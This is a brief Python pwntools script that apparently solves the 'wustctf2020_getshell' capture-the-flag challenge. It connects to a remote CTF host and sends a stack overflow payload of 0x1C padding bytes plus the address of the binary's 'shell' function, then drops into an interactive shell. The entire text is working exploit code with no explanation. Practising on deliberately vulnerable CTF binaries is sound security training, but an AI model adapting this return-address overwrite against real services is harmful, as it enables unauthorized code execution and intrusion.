from pwn import *

context.arch = 'i386'

elf = ELF('./wustctf2020_getshell')
r = remote('node3.buuoj.cn', 26624)

[r.recvline() for i in range(5)]
r.send(b'\x00' * 0x1C + p32(elf.sym['shell']))
r.interactive()
